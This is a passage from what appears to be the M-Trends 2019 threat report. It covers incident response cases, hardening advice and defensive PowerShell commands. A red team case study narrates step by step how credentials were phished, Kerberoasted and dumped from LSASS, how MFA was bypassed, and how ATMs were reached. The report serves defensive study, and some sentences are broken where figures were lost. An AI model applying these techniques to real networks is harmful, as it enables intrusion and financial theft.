(such as maintaining persistence or data exfiltration).
Organizations will need to adapt their email defenses and
monitor attacker techniques to improve their detection
and response capabilities. This will require continued
vigilance, which includes threat intelligence for visibility
into evolving attacker TTPs or campaigns, and appropriate
security solutions aimed at detecting malicious links or
attachments in emails.

Recommendations
FireEye recommends the following mitigation and detection
strategies as part of the M&A process:
1.

Conduct a compromise assessment of the acquisition to
attempt to identify any current or previous compromises.

2.

Conduct a proactive review searching for evidence of
potential attacker activity within the acquiring and acquired
networks before integrating them.

3.

Audit rights to identify accounts with access to other users’
email.

4.

Disallow the automatic forwarding of email outside the
organizations or regularly audit the forwarding rules on
their organization’s mail servers to detect evidence of this
technique.

5.

Enable audit logging on O365.

6.

Enable multi-factor authentication on O365.

The following PowerShell command can be used to restrict auto
forwarding of emails to remote domains:

Set-RemoteDomain Default
-AutoForwardEnabled $false
The following PowerShell command can be used to enumerate the
forwarding rules for mailboxes on an Exchange server:

Get-Mailbox | where {($.ForwardingAddress
-ne $null -or $.ForwardingSMTPAddress
-ne $null)}| select Name,
ForwardingAddress, ForwardingSMTPAddress,
DeliverToMailboxAndForward

SPECIAL REPORT | M-TRENDS 2019

A Case of
Mistaken Identity
In the second half of 2018, FireEye Mandiant began
responding to and tracking attacker activity now
attributed to the threat group TEMP.Demon. This group
leveraged a vulnerability from a popular web content
management system to gain access to companies in the
financial sector. Victims included both FireEye product
customers and FireEye managed detection and response
customers. Visibility across our product and service
portfolios allowed Mandiant consultants to quickly identify
the attacker TTPs, including their command and control
infrastructure. This knowledge enabled our experts to help
a client deconflict between authorized red team activity
from that of an attacker—leading to rapid investigation
and remediation that prevented information exposure.

The attacker leveraged a web content management
system vulnerability to install webshell variants such as
DEVILZSHELL, ASPXSHELL, WEBSNIFF and TABLETOP
on Internet-facing web servers. The attacker then used
publicly available webshells to remotely execute code
and elevate privileges on the compromised Windows
servers. The attacker executed publicly available
credential harvesting tools, such as Procdump, Mimikatz
and SafetyKatz to obtain local and domain credentials,
and laterally access additional systems in the targeted
environment.
Stolen domain credentials were used to rapidly deploy
Cobalt Strike payloads to systems in the targeted
environment. Cobalt Strike is threat emulation software
often used by red teams and real-world attackers for
its remote access trojan (RAT) and detection evasion
capabilities. The use of Cobalt Strike triggered alerts
reviewed and forwarded to the customer by FireEye
Managed Defense staff for deconfliction.
Inopportunely, the customer had an authorized red team
assessment, conducted by a different vendor, underway in
the same network segment as the detected Cobalt Strike
activity. Many tools used by the attacker, in addition to
Cobalt Strike, are also commonly used during red team
assessments (Fig. 9). At first glance, this could certainly
be overlooked as red team activity and in fact led the
customer to initially attribute the detected activity to the
ongoing red team assessment. Fortunately, knowledge
from prior investigations and visibility across product
customers allowed Mandiant to demonstrate that the
activity was distinct from the red team activity, and the
result of a highly motivated adversary that required
immediate response.

The ensuing investigation tracked the presence of Cobalt Strike to the client’s
web server and identified the webshell and vulnerability behind the initial
point of entry in the content management system. Once the point of entry,
compromised accounts and accessed systems were identified, Mandiant experts
were confident the attacker was only in the environment for a short period of
time. The speed at which the attacker was installing backdoors onto the target
systems (10 per hour) was significant enough to warrant the following actions
without further investigation:
• Remove the compromised webserver
• Remove compromised systems
• Disable compromised accounts
• Block all known CnC infrastructure

This case highlighted the complexities of untangling legitimate penetration
testing activity from possible simultaneously occurring attack activity.
Despite potential confusion, decisive action is required to prevent data loss.
Preparedness, visibility and vigilance are critical in the first hours of
a compromise.

SPECIAL REPORT | M-TRENDS 2019

Finding Weaknesses
Before the Attackers Do
FireEye Mandiant red team consultants perform
objectives-based assessments that emulate real cyber
attacks by advanced and nation state attackers across the
entire attack lifecycle by blending into environments and
observing how employees interact with their workstations
and applications. Assessments like this help organizations
identify weaknesses in their current detection and
response procedures so they can update their existing
security programs to better deal with modern threats.
A financial services firm engaged a Mandiant red team
to evaluate the effectiveness of its information security
team’s detection, prevention and response capabilities. The
key objectives of this engagement were to accomplish the
following actions without detection:

• Compromise Active Directory (AD): Gain domain

administrator privileges within the client’s Microsoft
Windows AD environment.
• Access financial applications: Gain access to

applications and servers containing financial transfer
data and account management functionality.
• Bypass RSA Multi-Factor Authentication (MFA): Bypass

MFA to access sensitive applications, such as the client’s
payment management system.
• Access ATM environment: Identify and access ATMs in a

segmented portion of the internal network.

44

SPECIAL REPORT | M-TRENDS 2019

Initial Compromise
Based on Mandiant’s investigative experience, social
engineering has become the most common and efficient
initial attack vector used by advanced attackers. For this
engagement, the red team used a phone-based social
engineering scenario to circumvent email detection
capabilities and avoid the residual evidence that is often
left behind by a phishing email.

After the OWA portal was cloned, the red team identified
IT helpdesk and employee phone numbers through further
OSINT. Once these phone numbers were gathered, the
red team used a publicly available online service to call
the employees while spoofing the phone number of the IT
helpdesk.
Mandiant consultants posed as helpdesk technicians
and informed employees that their email inboxes had
been migrated to a new company server. To complete
the “migration,” the employee would have to log into the
cloned OWA portal. To avoid suspicion, employees were
immediately redirected to the legitimate OWA portal once
they authenticated. Using this campaign, the red team
captured credentials from eight employees which could be
used to establish a foothold in the client’s internal network.

While performing Open-source intelligence (OSINT)
reconnaissance of the client’s Internet-facing
infrastructure, the red team discovered an Outlook Web
App login portal hosted at https://owa.customer.example.
The red team registered a look-alike domain (https://owacustomer.example) and cloned the client’s login portal
(Fig. 11).

Establishing a Foothold
Although the client’s virtual private

implemented MFA that required users
to provide a password and RSA token

portal (Fig. 12).

Figure 12. Single factor mobile device management portal.
App Delivery Portal

https://mydevice.mmas360.com/authApp.htm?c=

Using stolen domain credentials, the
red team logged into the BYOD web
portal to attempt enrollment of an
Android phone for CUSTOMER\user0.
While the red team could view user
settings, they were unable to add a
new device. To bypass this restriction,
the consultants downloaded the
IBM MaaS360 Android app and
logged in via their phone. The device
configuration process installed the
client’s VPN certificate (Fig. 13), which
was automatically imported to the
Cisco AnyConnect app—also installed
on the phone.
After launching the AnyConnect app,
the red team confirmed the phone
received an IP address on the client’s
VPN. Using a generic tethering app
from the Google Play store, the red
team then tethered a laptop to the
phone to access the client’s internal
network.

Kerberoasting abuses
legitimate features
of Active Directory
to retrieve service
accounts’ ticketgranting service (TGS)
tickets and brute-force
accounts with weak
passwords.

Escalating Privileges
Once connected to the internal network,
the red team used the Windows “runas”
command to launch PowerShell as
CUSTOMER\user0 and perform a
“Kerberoast”6 attack.
To perform the attack, the red team
queried an Active Directory domain
controller for all accounts with a service
principal name (SPN). The typical
Kerberoast attack would then request
a TGS for the SPN of the associated
user account. While Kerberos ticket
requests are common, the default
Kerberoast attack tool7 generates an
increased volume of requests, which is
anomalous and could be identified as
suspicious. Using a keyword search for
terms such as “Admin”, “SVC” and “SQL,”
the consultants identified 18 potentially
high-value accounts. To avoid detection,
the red team retrieved tickets for this
targeted subset of accounts and inserted
random delays between each request.
The Kerberos tickets for these accounts
were then uploaded to a Mandiant
password-cracking server8 which
successfully brute-forced the passwords
of 4 out of 18 accounts within 2.5 hours.
The red team then compiled a list of
Active Directory group memberships for
the cracked accounts, uncovering several
groups that followed the naming scheme
of {ComputerName}_Administrators.
The red team confirmed the accounts
possessed local administrator privileges
to the specified computers by performing
a remote directory listing of \\
{ComputerName}\C$. The red team also
executed commands on the system using
PowerShell Remoting to gain information
about logged on users and running

software. After reviewing this data, the
red team identified an endpoint detection
and response (EDR) agent which had
the capability to perform in-memory
detections that were likely to identify
and alert on the execution of suspicious
command line arguments and parent/
child process heuristics associated with
credential theft.
To avoid detection, the red team created
LSASS process memory dumps by using
a custom utility executed via WMI. The
red team retrieved the LSASS dump
files over SMB and extracted cleartext
passwords and NTLM hashes using
Mimikatz.9 The red team performed this
process on 10 unique systems identified
to potentially have active privileged user
sessions. From one of these 10 systems,
the red team successfully obtained
credentials for a member of the Domain
Administrators group.
With access to this Domain Administrator
account, the red team gained full
administrative rights for all systems and
users in the customer’s domain. This
privileged account was then used to
focus on accessing several high-priority
applications and network segments to
demonstrate the risk of such an attack on
critical customer assets.

By reviewing user details, the red team identified the
CUSTOMER\CUSTOMER_ADMIN10 account was actually
the privileged account for the corresponding standard
user account CUSTOMER\user103. The red team then used
PowerView10, an open source PowerShell tool, to identify
systems in the environment where CUSTOMER\user103
was or had recently logged in (Fig. 17).

SPECIAL REPORT | M-TRENDS 2019

The red team used the credential for CUSTOMER\user103
to login, without MFA, to the web front-end of the RSA
security console with administrative rights (Fig. 19).
Many organizations have audit procedures to monitor
for the creation of new RSA tokens, so the red team
decided the stealthiest approach would be to provision
an emergency tokencode. However, since the client was
using software tokens, the emergency tokens still required
a user’s RSA SecurID PIN. The red team decided to target
individual users of the financial application and attempt to
discover an RSA PIN stored on their workstation.

While the red team knew which users could access
the financial application, they did not know the system
assigned to each user. To identify these systems, the red
team targeted the users through their inboxes. The red
team set a malicious Outlook homepage for the financial
application user CUSTOMER\user1 through MAPI over
HTTP using the Ruler11 utility. This ensured that whenever
the user reopened Outlook on their system, a backdoor
would launch.
Once CUSTOMER\user1 had re-launched Outlook and
their workstation was compromised, the red team began
enumerating installed programs on the system and
identified that the target user used KeePass, a common
password vaulting solution.

The red team performed an attack against KeePass to
retrieve the contents of the file without having the master
password by adding a malicious event trigger to the
KeePass configuration file (Fig. 20). With this trigger, the
next time the user opened KeePass a comma-separated

KeePass database, and the red team was able to retrieve
the export from the user’s roaming profile.

Accessing ATMs
The red team’s final objective was to access the ATM
environment, located on a separate network segment
from the primary corporate domain. First, the red team
prepared a list of high-value users by querying the
member list of potentially relevant groups such as ATM_
Administrators. The red team then searched all accessible
systems for recent logins by these targeted accounts and
dumped their passwords from memory.
After obtaining a password for ATM administrator
CUSTOMER\ADMIN02, the red team logged into the
client’s internal Citrix portal to access the employee’s
desktop. The red team reviewed the administrator’s
documentation and determined the client’s ATMs could
be accessed through a server named JUMPHOST01, which
connected the corporate and ATM network segments.
The red team also found a bookmark saved in Internet
Explorer for “ATM Management.” While this link could
not be accessed directly from the Citrix desktop, the
red team determined it would likely be accessible from
JUMPHOST01.

Figure 23.
Executing

ATMs as SYSTEM.

The jump server enforced MFA for users attempting to
RDP into the system, so the red team used a previously
compromised domain administrator account, CUSTOMER\
ADMIN01, to execute a payload on JUMPHOST01 through
WMI. WMI does not support MFA, so the red team was
able to establish a connection between JUMPHOST01 and
the red team’s CnC server, create a SOCKS proxy, and
access the ATM Management application without an RSA
pin. The red team successfully authenticated to the ATM
Management application and could then dispense money,
add local administrators, install new software and execute
commands with SYSTEM privileges on all ATM machines
(Fig. 23).

Takeaways: Multi-factor authentication, password policy and account segmentation
Multi-Factor Authentication
Mandiant experts have seen a significant uptick in the
number of clients securing their VPN or remote access
infrastructure with MFA. However, there is frequently
a lack of MFA for applications being accessed from
within the internal corporate network. Therefore, FireEye
recommends that customers enforce MFA for all externally
accessible login portals and for any sensitive internal
applications.
Password Policy
During this engagement, the red team compromised
four privileged service accounts due to the use of weak
passwords which could be quickly brute forced. FireEye
recommends that customers enforce strong password
practices for all accounts. Customers should enforce a
minimum of 20-character passwords for service accounts.
When possible, customers should also use Microsoft
Managed Service Accounts (MSAs) or enterprise password
vaulting solutions to manage privileged users.
Account Segmentation
Once the red team obtained initial access to the
environment, they were able to escalate privileges in the
domain quickly due to a lack of account segmentation.
FireEye recommends customers follow the “principle of
least-privilege” when provisioning accounts. Accounts
should be separated by role so normal users, administrative
users and domain administrators are all unique accounts
even if a single employee needs one of each.

Normal user accounts should not be given local
administrator access without a documented business
requirement. Workstation administrators should not be
allowed to log in to servers and vice versa. Finally, domain
administrators should only be permitted to log in to
domain controllers, and server administrators should not
have access to those systems. By segmenting accounts in
this way, customers can greatly increase the difficulty of
an attacker escalating privileges or moving laterally from a
single compromised account.
Conclusion
As demonstrated in this case study, the Mandiant red team
was able to gain a foothold in the client’s environment,
obtain full administrative control of the company
domain and compromise all critical business applications
without any software or operating system exploits.
Instead, the red team focused on identifying system
misconfigurations, conducting social engineering attacks
and using the client’s internal tools and documentation.
The red team was able to achieve their objectives due
to the configuration of the client’s MFA, service account
password policy and account segmentation.

SPECIAL REPORT | M-TRENDS 2019

Attacker Attribution,
or The Secret Knock
FireEye Mandiant responded to an incident at an Asian telecommunications
company that involved an extortion email sent from the CEO’s work email account
by an external attacker. The email was sent to employees and threatened to
damage the company’s server infrastructure and publish or sell stolen customer
information. The attacker demonstrated access to the company’s infrastructure by
shutting down 35 non-critical servers. Though the attacker did not subsequently
follow through on the extortion demand, the level of control they demonstrated by
rebooting the servers prompted an immediate and extensive investigation.

The investigation by Mandiant consultants indicated the
attacker had maintained access for at least three years,
using a combination of Meterpreter reverse shells and
SOGU backdoors on compromised systems. From 2015 to
2016, the attacker used variants of tools such as WMIEXEC,
SOGU and webshells to perform lateral movement and
strengthen their foothold in the client’s environment.
WMIEXEC, a WMI-based command shell utility encoded in
VBScript, allowed the attacker to execute commands and
create file shares on remote systems. SOGU enabled the
attacker to upload and download files and execute arbitrary
processes and remote shell abilities.
The use of SOGU malware is attributed to Chinese
espionage actors only and is shared among multiple
Chinese groups. Telecommunications targeting is strategic
and ideal for Chinese state-sponsored threat actors, as it
gives potential insight into the communications of targets
of interest, such as government officials (incumbent and

opposition), religious leaders (Buddhist, Muslim), business
executives and diplomats. This client organization was a
strategic target of Chinese state-sponsored threat actors
given the increasing market pressure put on Chinese
telecom companies as they compete to expand their global
business and footprint.
The SOGU backdoors were loaded using DLL “side-loading.”
To avoid detection, each SOGU backdoor was configured
to be loaded by a different legitimate application within
the client’s environment (Fig. 24). For example, the
investigation identified “CrashReport.exe” as a legitimate
and signed application. The attacker crafted a malicious
DLL and named it “NetUtil.dll” so it would be loaded by
“CrashReport.exe.” Once the malicious “NetUtil.dll” was
loaded it decrypted SOGU backdoor shellcode from a file
named “license.rtf.”

In 2017, the attacker began using WMI and BITS to maintain persistence.
Although Mandiant has documented the use of WMI and BITS for years, these
persistence mechanisms are still less common than others such as Windows
registry run keys, Windows services and scheduled tasks.
Fig. 25 contains an example of a recovered WMI persistence mechanism
leveraged by the attacker. The attacker configured PowerShell code to execute
on an hourly-basis that decoded and executed a SOGU backdoor from the
Windows registry.

The cycle of reconnaissance, credential harvesting and lateral movement
continued throughout 2017 and 2018 before the attacker sent the extortion
email. After notifying the company of their presence by way of the extortion
email, the attacker continued to compromise additional systems and
credentials.
At one point, the attacker performed enterprise-wide Chrome credential
harvesting using a scheduled task that launched an in-memory-only copy of
PowerShell Mimikatz that was hosted on an internal Linux server. We believe
this was the attacker’s attempt to ensure future access to the environment in
the event of remediation activities.
Conclusion
While the extortion email was attributed to a China-based threat actor, we
very rarely see Chinese state-sponsored actors compromise organizations for
financial gain in addition to espionage. It is notable that although the attacker
followed through on their destructive threat, they did not follow up on the
extortion demand. This behavior that does not fit the profile of a nation-state
actor or a financially motivated actor, demonstrating how the lines between the
two are blurring.

Premediation

Preventative Best Practices from the
Frontlines of Incident Response

Premediation:
Proactively
implementing common
remediation-focused
initiatives.

Proactive Remediation
Throughout 2018, FireEye Mandiant consultants led multiple
remediation efforts to contain and eradicate attackers from
environments. In these engagements, consultants help
clients implement security configuration and architectural
enhancements to secure their environments, often in
a relatively short timeframe under stressful conditions.
Common remediation activities include:

In many instances, if hardened security configurations,
tested processes and architectural controls had been in
place before an incident, the incident could have been
prevented or rapidly contained. FireEye has coined the
term “premediation” to refer to the proactive implementation
of security configurations and architectural enhancements
that are commonly implemented as part of remediation
efforts.

• Enforcing advanced audit policy configurations on

To help organizations align focus and prioritize reviewing,
validating and enhancing their security controls,
premediation concepts can be organized into four distinct
categories:

endpoints using Group Policy to ensure optimized
visibility for investigative and incident response teams.
• Hardening of environments to limit lateral movement

capabilities using a combination of network
segmentation and endpoint hardening.
• Implementing security controls to minimize remote

usage of local accounts across endpoints, using a
combination of Microsoft Local Administrator Password
Solution (LAPS) and Group Policy configurations.
The built-in local administrator account is a common
account targeted by attackers for lateral movement
across endpoints.
• Reducing the exposure of account artifacts pertaining to

privileged accounts across endpoints.
• Preparing for and executing coordinated enterprise-

wide password resets with clients.

• General posturing
• Privileged account management
• Active Directory hardening
• Endpoint hardening

SPECIAL REPORT | M-TRENDS 2019

General Posturing
Before an environment can be properly hardened and secured, organizations must first ensure
that visibility and detection mechanisms are tuned for the current environment to reduce
potential operational impacts. This, in turn, helps ensure that any planned security controls will
be effective in mitigating risks related to an attacker compromising the existing infrastructure
and underlying data.
Visibility
We frequently observed that deficiencies in organizations’ understanding of and
visibility into their own environment directly led to failures in their ability to detect and
respond to breaches. This allowed attackers to access critical systems without detection
and consequently hampered organizations’ ability to implement eradication steps in a
short timeframe.

Common questions organizations should ask:

Have we documented all attack vectors that can be used by someone external or internal to
our organization to gain access to our systems and data?

What single-factor applications are external facing and can be used for authentication from
untrusted locations to access data?

Have we tested any multi-factor authentication we have in place, to see if it can be circumvented
by an attacker?
Would we be able to detect such activity now?

Do we have proper security tools in place to alert us to evidence of an active or historic
compromise within our environment?

Have we tested the effectiveness of our existing visibility and security controls, to ensure that our
technology investment is optimized to reduce risk?

SPECIAL REPORT | M-TRENDS 2019

Password Resets
Breached organizations often
execute an enterprise-wide password
reset during the breach recovery
process. Changing passwords for
domain-based service accounts
was the single biggest contributor
to delayed breach remediation for
Mandiant investigations in 2018. This
was primarily due to lack of both
knowledge and documentation of
service accounts.
For faster breach response,
organizations should document all
domain-based service accounts
with the following information
(at a minimum):

Account name

Account function

Systems where the account is used and required to be granted
logon permissions

Level of privilege or access required

Business and technical owner of the system, application or account

System and application that uses the account

Process for changing the account password – and updating relevant
configuration settings to reflect the new password

Preparing for and executing an enterprise-wide password reset may also include these common steps:

1

Enhancing or creating password policies to enforce different password complexity requirements for specific account
types (e.g., user, service, privileged).

2

Identifying and documenting all dormant accounts which should ideally be disabled during the enterprise-wide
password reset—until the respective account user can reset the password.

3

Documenting and testing a plan for enforcing an automated password reset for standard user accounts. Privileged
and service accounts typically require a manual password reset, heightening the necessity to accurately identify the
scope of these accounts within an environment. This planning phase should include a review of the scope of privileges
assigned to these accounts and remove (deprivilege) any accounts that do not require administrative privileges within
the environment.

4

Planning for the implementation of MFA, including steps for enrolling users, monitoring enrollment status and devices
correlating to each account and enforcing MFA mechanisms for external-facing services.

5

Performing a Kerberos (“krbtgt”) password reset before resetting passwords for most other accounts within the
environment.

65

SPECIAL REPORT | M-TRENDS 2019

Network Segmentation and Logs
Visibility, logging, and detection gaps should be identified
at both the network and endpoint layers. Validation should
be initiated for logs specific to critical assets. Proper
logging configurations should enable identification of
abnormal connections and access events.
Ensure that logging configurations collect data relevant to:
• Logon and logoff activity, such as Kerberos Service

Ticket Operations
• Process execution events, such as command line logging
• Directory Service Access and Changes (helps detect

potential DCShadow and DCSync activity in Active
Directory environments)
• Security Group Management activity (captures

modifications to security groups)

• PowerShell activity, such as Module, ScriptBlock and

Transcription logging
• DNS queries and events, such as DNS Analytical

Logging can be used to enhance visibility of DNS
activity when Windows servers are used to provide
client name resolution
• Remote access and VPN connections
• NetFlow data, including both north/south and east/west

traffic
• Proxy servers, firewalls and egress communications
• Load balancers, including capturing X-Forwarded-For

(XFF) HTTP headers
• Access and authentication to cloud-hosted services (e.g,

Microsoft Azure, Office 365, Amazon Web Services)

For network posturing:

Design the network architecture to
segment and restrict communications
between systems based on the function of
systems and the type of data that reside on
systems and within specific applications.

Ensure proper segmentation is configured
for administrative and management systems
(e.g., jump boxes), which are accessed by
privileged users and used for security and
administration purposes.

For third-party connectivity into an
environment, ensure that segmented
enclaves are used to restrict access to
only the systems and data required per
contractual obligations for third-party
contractors or vendors.

SPECIAL REPORT | M-TRENDS 2019

Tiered Model
Model in which
privileged accounts can
only be used to access
systems that reside
within a tier that is
defined by the system’s
function and role within
an environment.

Privileged Account Management
Privileged account management is one of the most important considerations for
organizations. During Mandiant incident response investigations in 2018, a common theme
we observed was the compromise of highly privileged account credentials in memory on
endpoints where an attacker established a presence. In fact, many “patient zero” endpoints
were systems assigned to standard users where a highly privileged account (e.g., Domain
Admin permissions) was used at one point to log on and assist a user.
When an account is used to log on to a system (interactively or even remotely using
Remote Desktop), credentials can remain in LSASS memory until a system has been
rebooted. If an attacker compromises an endpoint where a privileged account previously
logged on, an attacker can obtain credential artifacts (password or hashes) from memory
to laterally move throughout an environment.
Tiered Model
The core of premediation guidance is for organizations to use security controls to restrict
the use of privileged accounts on endpoints with a tiered model for administration (Tier 0
– Tier 2).12 Organizations should use the following IRM principles to establish processes for
privileged account usage within an environment:
• Identify and understand the scope of privileged accounts that exist within the

environment
• Restrict how and where privileged accounts can be used within the environment
• Monitor and enforce detection when attempts are made to use privileged accounts

ACCOUNT HARDENING
Organizations should use either Group Policy or Authentication Silos to reduce the scope of privileges assigned to users
and services and limit where privileged accounts can be used within an environment.
• Inherent to modern Active Directory environments,

Microsoft’s Local Administrator Password Solution
(“LAPS”) provides centralized management and
randomization for the password of the built-in local
administrator account across domain joined computers.
• With KB2871997, Microsoft introduced “S-1-5-114:

NT AUTHORITY\Local account and member of
Administrators group,” which provides an effective way
to quickly use Group Policy settings to restrict remote
logons using any local privileged account that may exist
on an endpoint.

12 Microsoft (October 11, 2016). Securing Privileged Access Reference Material.

Standard user accounts should not require administrative
privileges to perform daily job functions and service
accounts should operate with the lowest privilege level
possible on an endpoint. Accounts delegated with local
or domain-based privileged access should be explicitly
denied access to common endpoints, which are often the

User Rights Assignment
Security Options

• Deny access to this computer from the network (SeDenyNetworkLogonRight)
• Deny log on as a batch job (SeDenyBatchLogonRight)
• Deny log on as a service (SeDenyServiceLogonRight)
• Deny log on locally (SeDenyInteractiveLogonRight)
• Deny log on through Terminal Services
(SeDenyRemoteInteractiveLogonRight)
• Debug programs (SeDebugPrivilege) - should be removed for all users including local administrators

Tips for account hardening
• Identify the scope of privileged accounts that exist

within the environment.
–– This not only includes accounts that are directly

members of built-in privileged groups – but also
nested groups and inherited group memberships for
accounts, which could provide access rights for a
path for privileged access.
• Enforce a Tiered Architecture Model for restricting

access using privileged accounts.
• Implement and use designated and isolated Jump

Boxes / Privileged Access Workstations (PAWS) - for
performing administrative functions and tasks with
specific accounts designated for usage within each tier.
• Use the Protected Users Active Directory security group

for housing privileged and sensitive accounts.
• Use Restricted Admin Remote Desktop or Remote

Credential Guard when remote desktop protocol (RDP)
is used for administrative access to endpoints.

• Use separate VPN profiles for administrators (including

accounts that have privileged access) – which include
MFA requirements and stateful access-control lists to
further restrict remote access to Jump Boxes / PAWS
within the environment.
• Use a Privileged Access Management (PAM) solution—

which supports automated password rotation,
time-based access-control conditions (just-in-time
administration), and verbose logging and auditing of
when privileged accounts are accessed and used.
• For cloud administration, use separate and dedicated

accounts that are not used for managing and
administering on-premise systems and architecture.
–– At a minimum, do not replicate privileged on-

premise accounts to Microsoft Azure using AD
Connect.

ACTIVE DIRECTORY HARDENING
Active Directory is the core foundation and backend platform for most organizations. It provides identity management,
authentication services and authorization for access to applications and data. Threat actors commonly exploit Active
Directory misconfigurations to elevate privileges and move laterally through an environment.

Tips for active directory hardening

• Review Forest architectures and trusts. Focus on

the direction of the trust and if any security controls
(selective authentication, SID filtering, disabling
of Kerberos Full Delegation across the trust) are
enforced. Mandiant experts commonly observe Active
Directory trusts that are configured for bi-directional
authentication, with few controls enforced to restrict
and govern the scope of accounts permitted to access
resources across a trust boundary. Without controls in
place, an attacker can jump from one forest to another
and move laterally across a trust boundary.

• Review operational processes and hardening strategies

for Active Directory, such as:
–– Logging / monitoring / alerting for Active Directory

specific events
–– Group Policy Objects (GPOs)
–– Administration models (access control tiers)
–– Remote administration
–– Service principal names (SPNs)
–– Service accounts
–– Privileged accounts
–– Delegated accounts
–– Accounts with directory replication permissions
–– Password policies
–– Kerberos authentication policies
–– Access control (ACL) configurations for accounts

SPECIAL REPORT | M-TRENDS 2019

ENDPOINT HARDENING
A user endpoint is the most common starting point of an initial compromise. In addition to network segmentation and
communication restrictions between endpoints, additional hardening should be implemented to enhance controls that
prevent initial infection, lateral movement and privilege escalation.

Tips for endpoint hardening:

• Use Group Policy settings to centrally enforce hardening

controls for Microsoft Office to minimize endpoint
infection risks due to a weaponized email attachment or
document. Protection considerations include:
–– Restrictions to block macros from running in Office

files received from external sources
–– Trust Center hardening that defines and enforces

controls for Dynamic Data Exchange (DDE), trusted
documents, trusted locations, File Block settings,
Protected View and automatic links
–– Object Linking and Embedding (OLE) to block

specific file extensions for OLE embedding
(py;rb;iqy) not blocked by default by Microsoft, and
to restrict OLE package activation behaviors
• Disable legacy versions of protocols on endpoints, as

these provide a vector for an attacker to use tools that
rely upon the functionality of legacy protocols, such as
SMB v1.0 and PowerShell v2.0.
• Disable WDigest authentication on endpoints (Windows

OS platforms pre-Windows 8.1 / 2012 R2). If WDigest
authentication is enabled, cleartext credentials are
stored in memory. WDigest authentication can be
disabled via a registry modification or by using a
Microsoft Group Policy ADMX template.
• Review and reduce the scope of standard users with

local administrative permissions on endpoints.
• Ensure that the built-in local administrator account

has a unique and random password configured across
all endpoints. Use the Microsoft Local Administrator
Password Solution tool (LAPS)13 or a third-party

privileged access management (PAM) technology.
Additionally, any local administrator accounts should
be restricted from initiating network, service, or remote
desktop (RDP)-based logons across endpoints. Using
Group Policy, any local administrative accounts can be
referenced via the security setting of:
S-1-5-114: NT AUTHORITY\Local account and
member of Administrators group
• Enforce segmentation at the endpoint to prevent

common lateral movement techniques between
systems. Endpoint segmentation controls can even
prevent ransomware from propagating throughout an
environment and impacting operations and system
availability. Common endpoint segmentation controls
for implementation using host-based firewalls (including
Windows Firewall) include:
–– Blocking SMB communications between

workstations and laptops
–– Blocking RDP communications between

workstations and laptops, and from user endpoints
to servers and critical assets
–– Blocking WMI and Windows Remote Management

/ PowerShell Remoting (WinRM) between
workstations and laptops, and from user endpoints
to servers and critical assets
–– Enforce application whitelisting, starting with critical

servers and systems (e.g., Domain Controllers).
Applocker14 is an inherent enterprise-level Microsoft
technology that can be used to enforce application
whitelisting on Windows systems.

Programmatic
Enhancements

from the Frontlines of Incident Response
In addition to the security configuration and architectural weaknesses
commonly observed during investigation and remediation, FireEye
Mandiant consultants repeatedly observed three common issues during
enterprise investigations in 2018.
• Destruction of evidence, which leads directly to unanswered questions in

the investigative process.
• Lack of proper investigation and escalation of initial detections, which

allows a larger attack to go unnoticed.
• Poorly timed eradication actions, which are unsuccessful in eradicating

attacker access and complicate the investigative process.
While premediation covers technical enhancements, organizations can
also make programmatic changes to improve both their incident response
program and their ability to support remediation activities.

70

SPECIAL REPORT | M-TRENDS 2019

Destruction of Evidence
To facilitate rapid remediation of identified threats, Mandiant has observed that organizations build incident response plans and
associated use cases and playbooks that follow the “re-image and replace” model. For example:

Security toolset identifies a possible threat
on a user’s workstation and generates an
alert for an analyst.

The analyst analyzes the system, confirms
the presence of malware but identifies no
other malicious activity.

The analyst initiates a process to reimage the compromised workstation,
so the user can get back to work
quickly.

If the detected activity was part of a larger breach unnoticed by the frontline analyst, these issues could destroy valuable evidence
on the workstation. We have conducted investigations where key questions went unanswered due to this type of data destruction,
including identification of the initial point of entry for an attack or details on the full extent of data stolen by an attacker.

Lack of Investigation
We frequently uncovered evidence of attacker malware
that was identified and/or cleaned by security tools. It was
not uncommon to learn that that detection was not only
escalated to a central dashboard, but also reviewed by an
analyst.
For example, an attacker moves laterally to a workstation
and executes a password harvesting tool that is stopped
and cleaned by antivirus software. Following a playbook,
the analyst:
• Confirms that the tool detected the malware.
• Confirms that the tool successfully eradicated that piece

of malware.

The playbook lacked steps that would help understand
the context of the malware and determine if it required
a more in-depth analysis of the infected system or the
broader environment. If a more in-depth analysis had been
performed, the analyst could have identified that access
to the system occurred as a result of lateral movement
from another system in the environment and not through
a new attack. The analyst might have discovered that
the attacker ran several different tools over an extended
period of time—clues that this was part of a larger breach.
In this case, a deficient playbook contributes directly to a
larger breach, because the attacker went unnoticed for a
longer period of time. This is critical, because the sooner a
victim identifies an intrusion, the faster they can respond
to it, thus reducing the amount of time attackers have to
accomplish their mission.

72

SPECIAL REPORT | M-TRENDS 2019

Poorly Timed Remediation
Even when organizations do correctly identify malicious
activity as being part of a larger breach, we have observed
organizations hamper investigations due to timing
mistakes in their response and remediation processes. This
is especially true for organizations that become aware
of a breach by a sophisticated group through external
notification from law enforcement. These notifications
often result from lengthy investigations into specific attack
groups and occur after attackers have had access to the
victim environment for months.
After confirming the initial lead from law enforcement, the
victim takes immediate steps to eradicate the attackers,
including removing affected systems from the network,
blocking access to known command and control channels
and changing the passwords of known affected user
accounts.
Sophisticated attack groups that have had long term access
to a victim are likely to have deployed multiple different
backdoors and avenues for remote access to the victim’s
network to ensure that they maintain persistence over time.
In these cases, hasty eradication measures are unlikely to
remove these remote access methods. This not only fails
to eradicate the attacker from the environment, but also
results in the loss of the only current visibility into attacker
activity. This sequence of events may motivate the attacker
to modify TTPs or take additional actions to maintain their
access.
In these scenarios, the victim fails to eradicate the attacker,
complicates the investigation and prolongs the investigation
and remediation process. By responding too quickly, the
victim inadvertently prolongs the breach.

Recommendations for Enabling Effective Remediation
These common issues could have been prevented by
adopting a more robust incident response plan and
playbooks for investigation and response. Based on
Mandiant observations, FireEye recommends that
organizations:
• Conduct regular reviews of their incident response

plan, use cases and playbooks
–– Perform internal tabletop training exercises, red/blue

team exercises or third-party reviews.
–– Consider events and incidents of different severities

and complexities and account for real world
factors such as inconclusive evidence, mistakes by
responders and business impact of eradication steps.
• Ensure that these documents include processes that

preserve evidence
–– Consider what steps in their existing playbooks

result in destruction of evidence, what evidence
is destroyed and how that could impact
investigations. Use this data to weigh the risk of
evidence destruction against the cost of evidence
preservation and incorporate procedures to archive
relevant evidence in response playbooks.
–– Include or reference approved processes for the

proper handling, storage and documentation of
evidence in incident response plans.

SPECIAL REPORT | M-TRENDS 2019

• Develop guidelines to understand the context around

identified threats and establish escalation procedures
to more experienced analysts
–– Develop a threat and severity matrix for security

events and incidents to establish thresholds that will
